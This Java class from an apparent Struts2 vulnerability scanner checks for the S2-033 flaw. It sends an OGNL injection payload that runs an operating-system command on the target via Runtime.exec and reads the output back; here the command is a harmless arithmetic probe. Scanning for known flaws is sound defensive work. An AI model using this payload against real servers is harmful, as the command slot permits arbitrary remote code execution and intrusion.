package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_033 implements Check {
    public String printInfo(){
        String info = "[+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=expr%20"+number1+"%20%2B%20"+number2;



        if (path==null){
            path = "/";
        }else if(!path.endsWith("/")){
            path = path+"/";
        }

        String url = protocol + "://" + host + ":" + port + path  +poc;

        int number = number1+number2;

        HttpResult result = HttpClient.get(url);
        Pattern p = Pattern.compile(String.valueOf(number));
        Matcher m = p.matcher(result.getData());

        if (m.find()) {
            return true;
        } else {
            return false;
        }

    }


}
